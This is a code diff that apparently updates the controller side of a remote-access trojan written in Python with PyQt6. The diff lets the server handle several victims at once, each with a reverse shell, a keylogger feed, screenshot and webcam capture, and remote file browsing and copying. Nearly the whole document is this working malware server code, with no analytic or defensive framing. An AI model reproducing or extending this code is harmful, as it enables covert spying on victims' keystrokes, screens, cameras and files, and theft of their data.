@@ -12,8 +12,10 @@ from keylog_ui import  MainWindow as Ui_KeylogWindow
 from PyQt6 import QtCore, QtWidgets
 from PyQt6.QtCore import QPoint
 from PyQt6.QtWidgets import QApplication, QMainWindow, QTableWidgetItem, QTableWidget, QPushButton, QMenu
+from Client_Handler import Client
 
 SERVER_HOST = socket.gethostbyname(socket.gethostname())
+print(SERVER_HOST)
 SERVER_PORT_KEYLOGGER = 5000
 SERVER_PORT_SHELL = 5005
 SERVER_PORT_MANAGE_FILE = 5050
@@ -39,70 +41,58 @@ s3.listen(5)
 
 
 
+
 def reverse_shell(s1):
+    global cur_client
     print(f"Listening as {SERVER_HOST}:{SERVER_PORT_SHELL} ...")
-    socket, client_add = s1.accept()
-    print(f"{client_add[0]}:{client_add[1]} Connected!\n")
-    cwd = socket.recv(BUFFER_SIZE).decode()
-    ui.second_window.print_text(f"{cwd} $>")
-    ui.second_window.socket = socket
-    infor = socket.recv(BUFFER_SIZE).decode()
-    print(infor)
-    list_infor = infor.split(SEPARATOR)
-    ui.add_row(list_infor[0],list_infor[1],list_infor[2])
-    ui.keylog_window.setWindowTitle(list_infor[1] + "@KeyLog")
-    ui.keylog_window.filename = list_infor[1] + '.txt'
+    while True:
+        socket, client_add = s1.accept()
+        print(f"{client_add[0]}:{client_add[1]} Connected!\n")
+        cwd = socket.recv(BUFFER_SIZE).decode()
+        # ui.second_window.append(Ui_MainWindow2())
+        ui.second_window[ui.cnt].print_text(f"{cwd} $>")
+        ui.second_window[ui.cnt].socket = socket
+        infor = socket.recv(BUFFER_SIZE).decode()
+        list_infor = infor.split(SEPARATOR)
+        ui.add_row(list_infor[0], list_infor[1], list_infor[2])
+        ui.keylog_window[ui.cnt].setWindowTitle(list_infor[1] + "@KeyLog")
+        ui.keylog_window[ui.cnt].filename = list_infor[1] + '.txt'
+        # ui.keylog_window[ui.cnt].show()
+        cur_client.increase()
+        if cur_client.cnt == 3:
+            list_client.append(cur_client)
+            cur_client.cnt += 1
+            ui.cnt+=1
+            cur_client = Client(ui.cnt, ui)
 
 def key_logger(s2):
+    global cur_client
     print(f"Listening as {SERVER_HOST}:{SERVER_PORT_KEYLOGGER} ...")
-    socket, client_add = s2.accept()
-    print(f"{client_add[0]}:{client_add[1]} Connected!\n")
     while True:
-        output = socket.recv(BUFFER_SIZE).decode()
-        str1, str2 = output.split(SEPARATOR)
-        with open(f'{str1}.txt', "a",encoding='utf-8') as file:
-            try:
-                file.write(f"{str2}\n")
-                ui.keylog_window.addLine(str2)
-            except Exception as e:
-                print(f"Error logging key: {e}")
+        socket, client_add = s2.accept()
+        # ui.keylog_window.append(Ui_KeylogWindow())
+        cur_client.add_keylog(socket)
+        cur_client.increase()
+        if cur_client.cnt == 3:
+            list_client.append(cur_client)
+            cur_client.cnt += 1
+            ui.cnt += 1
+            cur_client = Client(ui.cnt, ui)
 def manage_file(s3):
+    global cur_client
     print(f"Listening as {SERVER_HOST}:{SERVER_PORT_MANAGE_FILE} ...")
-    socket, client_add = s3.accept()
-    ui.manage_file_window.socket = socket
-    print(f"{client_add[0]}:{client_add[1]} Connected!\n")
-    data = b""
     while True:
-        chunk = socket.recv(4096)
-        if b"<end>" in chunk:
-            data += chunk.split(b"<end>")[0]
-            break
-        data += chunk
-
-    try:
-        directory_tree = json.loads(data.decode())
-        ui.manage_file_window.populate_tree_view(directory_tree)
-    except json.JSONDecodeError as e:
-        print(f"Error decoding JSON: {e}")
-
-    while True:
-        file_name_length = socket.recv(4)  # Expecting the length of the file name
-        if not file_name_length:
-            return
-
-        file_name_length = int.from_bytes(file_name_length, 'big')  # Convert bytes to int
-        filename = "copy_" + str(random.randint(1,1000)) + "_" + socket.recv(file_name_length).decode()
-        try:
-                print(f"Copy file {filename}")
-                with open(filename, 'wb') as f:
-                    while True:
-                        data = socket.recv(BUFFER_SIZE)
-                        if b"<end>" in chunk:
-                            f.write(data.split(b"<end>")[0])
-                            break
-                        f.write(data)
-        except OSError as e:
-            print("")
+        socket, client_add = s3.accept()
+        # ui.manage_file_window.append(FileManagerServer())
+        ui.manage_file_window[ui.cnt].socket = socket
+        cur_client.add_manage_file(socket)
+        print(f"{client_add[0]}:{client_add[1]} Connected!\n")
+        cur_client.increase()
+        if cur_client.cnt == 3:
+            list_client.append(cur_client)
+            cur_client.cnt += 1
+            ui.cnt += 1
+            cur_client = Client(ui.cnt, ui)
 
 
 
@@ -112,6 +102,8 @@ class Ui_MainWindow(object):
         MainWindow.resize(1000, 800)
         self.centralwidget = QtWidgets.QWidget(parent=MainWindow)
         self.centralwidget.setObjectName("centralwidget")
+
+        self.cnt = 0
 
         self.tableWidget = QtWidgets.QTableWidget(parent=self.centralwidget)
         self.tableWidget.setGeometry(QtCore.QRect(0, 40, 1000, 600))
@@ -139,10 +131,17 @@ class Ui_MainWindow(object):
 
         # Connect right-click signal to the custom slot
         self.tableWidget.customContextMenuRequested.connect(self.onRightClick)
-        self.second_window = Ui_MainWindow2()
-        self.manage_file_window = FileManagerServer()
+        self.second_window = []
+        self.second_window.append(Ui_MainWindow2())
+        self.manage_file_window = []
         # self.keylog_window = None
-        self.keylog_window = Ui_KeylogWindow()
+        self.keylog_window = []
+        self.second_window.append(Ui_MainWindow2())
+        self.manage_file_window.append(FileManagerServer())
+        self.keylog_window.append(Ui_KeylogWindow())
+        self.second_window.append(Ui_MainWindow2())
+        self.manage_file_window.append(FileManagerServer())
+        self.keylog_window.append(Ui_KeylogWindow())
         MainWindow.setCentralWidget(self.centralwidget)
         self.menubar = QtWidgets.QMenuBar(parent=MainWindow)
         self.menubar.setGeometry(QtCore.QRect(0, 0, 800, 21))
@@ -188,17 +187,18 @@ class Ui_MainWindow(object):
 
             # Handle the selected action
             if action == remoteShell:
-                self.second_window.show()
+                print(f"call remoteshell at {row}")
+                self.second_window[row].show()
             elif action == keylog:
-                ui.keylog_window.readfile()
-                ui.keylog_window.show()
+                ui.keylog_window[row].readfile()
+                ui.keylog_window[row].show()
             elif action == screenShot:
                 # self.srceen_shot()
-                ui.second_window.screen_shot("src")
+                ui.second_window[row].screen_shot("src")
             elif action == webCam:
-                ui.second_window.screen_shot("webcam")
+                ui.second_window[row].screen_shot("webcam")
             elif action == showDir:
-                ui.manage_file_window.show()
+                ui.manage_file_window[row].show()
 
     def processInput(self, text):
         # Process the user input
@@ -208,12 +208,7 @@ class Ui_MainWindow(object):
 
 
 
-t1 = threading.Thread(target=reverse_shell, args=(s1,))
-t2 = threading.Thread(target=key_logger, args=(s2,))
-t3 = threading.Thread(target=manage_file, args=(s3,))
-t1.start()
-t2.start()
-t3.start()
+
 
 import sys
 app = QtWidgets.QApplication(sys.argv)
@@ -221,6 +216,19 @@ MainWindow = QtWidgets.QMainWindow()
 ui = Ui_MainWindow()
 ui.setupUi(MainWindow)
 MainWindow.show()
+list_client = []
+cur_client  = Client(ui.cnt,ui)
+
+t1 = threading.Thread(target=reverse_shell, args=(s1,))
+t2 = threading.Thread(target=key_logger, args=(s2,))
+t3 = threading.Thread(target=manage_file, args=(s3,))
+t1.start()
+t2.start()
+t3.start()
+
+
+
+
 sys.exit(app.exec())
 
 
